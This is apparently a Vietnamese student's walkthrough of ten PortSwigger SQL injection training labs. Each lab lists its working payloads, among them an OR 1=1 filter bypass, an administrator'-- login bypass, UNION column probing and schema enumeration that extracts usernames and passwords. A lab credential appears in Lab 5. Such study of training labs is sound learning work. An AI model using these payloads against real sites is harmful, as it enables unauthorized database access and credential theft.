# 1. LAB #



# 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data #

Mục tiêu của bài này là hiển thị hết các sản phẩm ẩn

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

`https://...web-security-academy.net/filter?category=Pets`
 Ta sẽ thêm `'OR 1=1'` đằng sau, vì điều kiện luôn đúng nên SQL sẽ trả về hết sản phẩm
 Hoặc
 `'UNION SELECT * FROM products--`

# 2.Lab: SQL injection vulnerability allowing login bypass

Input `username`: `administrator'--` để bypass password đằng sau

# 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Dò đến khi nào trang web hiển thị hợp lệ như bình thường để biết được database có bao nhiêu 
`https://....web-security-academy.net/filter?category=Gifts'union select null,null,null--`

# 4. Lab: SQL injection UNION attack, finding a column containing text

Đầu tiên ta tìm số cột

`https://...web-security-academy.net/filter?category=Pets'union select null,null,null--`

Có 3 cột
String cần tìm nằm ở cột 2

`https://...web-security-academy.net/filter?category=Pets'union select null,'a',null--`


<img width="458" height="149" alt="image" src="https://github.com/user-attachments/assets/3bd254f1-0056-4e14-bb25-1a0137784e13" />

`https://0a7e008404f6ae158040b21300a4004c.web-security-academy.net/filter?category=Pets'union select null,'T99fsn',null--`

<img width="366" height="129" alt="image" src="https://github.com/user-attachments/assets/275f26b9-8817-4f9b-b2d7-cffe5a5641fc" />

# 5. Lab: SQL injection UNION attack, retrieving multiple values in a single column

Đầu tiên ta sẽ dò số cột, được kết quả là 2 cột

`https://...web-security-academy.net/filter?category=Gifts'union select null,null--`

Sau đó sẽ dò xem cột nào có cùng data type với username, password --> cột số 2

`https://....web-security-academy.net/filter?category=Gifts%27union%20select%20null,%27a%27--`

Thông tin mình cần là gồm 2 giá trị nhưng lại chỉ có 1 cột nên ta sẽ dùng string concatenation để nối chuỗi và trả về trong 1 cột

<img width="902" height="339" alt="image" src="https://github.com/user-attachments/assets/5ec17977-8273-4385-b72f-c240632c1346" />

`administrator~rt133x6yio2m9ksjjnqz`

# 6. Lab: SQL injection attack, querying the database type and version on Oracle

Ta thử dò số cột bằng cách dùng `UNION SELECT NULL,...` nhưng đều trả về lỗi 
Vậy nên ta sẽ lấy thông tin version bằng cách truy vấn thẳng vào một bảng nào đó

Ta sẽ thử select database và version từ bảng v$version

<img width="457" height="163" alt="image" src="https://github.com/user-attachments/assets/598a1375-5470-448f-8efc-0ac10aae8a3e" />

Vậy là trong bảng v$version có 2 cột

<img width="926" height="323" alt="image" src="https://github.com/user-attachments/assets/703faac2-7506-4c87-a24b-76ed53a25021" />

`Accessories' union select banner, null from v$version--`

<img width="543" height="244" alt="image" src="https://github.com/user-attachments/assets/3f929f93-57a2-49cb-9c1c-16415d0b660d" />

# 7. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Vẫn như bài trên, ta sẽ dò số cột 

Thử `'union+select+null,null--` và thay đổi số lượng cột đều lỗi, tương tự với `'union+select+null,null#`
Nhưng để y rằng dấu `#` chưa được encode

<img width="193" height="35" alt="image" src="https://github.com/user-attachments/assets/759feaea-74d6-4daf-86b4-6869bdb9cc0b" />

Encode `#` thành `%23` --> `%27+union+select+null,%20null%23` 

<img width="911" height="310" alt="image" src="https://github.com/user-attachments/assets/ddf1b52d-9a12-490f-91aa-e39379a14b6c" />

Để trả về thông tin version `%27+union+select+@@version,%20null%23` 

<img width="284" height="206" alt="image" src="https://github.com/user-attachments/assets/69633792-2789-4d69-9949-b1c71fd646a0" />

# 8. Lab: SQL injection attack, listing the database contents on non-Oracle databases

Ngoại trừ Oracle, có một bảng chứa các thông tin tổng là `information_schema.tables`

`%27+union+select+null,null+from+information_schema.tables--`

<img width="924" height="311" alt="image" src="https://github.com/user-attachments/assets/684d6b34-cfa7-4172-817f-02f0037656d4" />

Vì ta không biết tên bảng chứa thông tin username, password nên sẽ phải sử dụng truy vấn trả về các bảng

`%27+union+select+TABLE_NAME,null+from+information_schema.tables--`

<img width="270" height="359" alt="image" src="https://github.com/user-attachments/assets/e8015003-ba16-446c-855b-b805a2bb45fc" />

`%27+union+select+COLUMN_NAME,null+from+information_schema.columns+where+table_name='users_vocvkc'--`

<img width="278" height="95" alt="image" src="https://github.com/user-attachments/assets/65c58e94-3dbd-4dc5-aac8-8fb51a56a3e8" />

`%27+union+select+username_zxzlui,password_muvfas+from+users_vocvkc--`

<img width="240" height="50" alt="image" src="https://github.com/user-attachments/assets/78715846-d2a5-40cc-943e-8ccce80e64e3" />

# 9. Lab: SQL injection attack, listing the database contents on Oracle

Xác định số cột
`%27union+select+null,null+from+all_tables--`

Xác định các bảng `%27union+select+table_name,null+from+all_tables--`

<img width="331" height="191" alt="image" src="https://github.com/user-attachments/assets/ad424c13-4071-4a78-8421-8f3b311e8207" />

Xác định các cột `%27union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_DLHIZI%27--`

<img width="217" height="392" alt="image" src="https://github.com/user-attachments/assets/67bb57f3-9493-43d1-b1dc-39cb37f97eb5" />

`%27union+select+PASSWORD_SUFMQR,USERNAME_LYMUQJ+from+USERS_DLHIZI--`

<img width="236" height="48" alt="image" src="https://github.com/user-attachments/assets/eb23fe2a-6ecf-4cb0-920a-62460dab84f7" />

# 10. Lab: SQL injection UNION attack, retrieving data from other tables

%27union+select+username,password+from+users--

<img width="200" height="48" alt="image" src="https://github.com/user-attachments/assets/22870294-ab41-40fd-8074-d0aadf400c74" />



# 2. NOTE #

- Sự khác biệt giữa 2 bảng `V$VERSION` và `V$INSTANCE`
+ V$VERSION: Phần mềm đang dùng phiên bản gì?
+ V$INSTANCE:
      ├── Instance tên gì?
      ├── Chạy trên host nào?
      ├── Version gì?
      ├── Trạng thái hiện tại?
      └── Khởi động lúc nào?

  

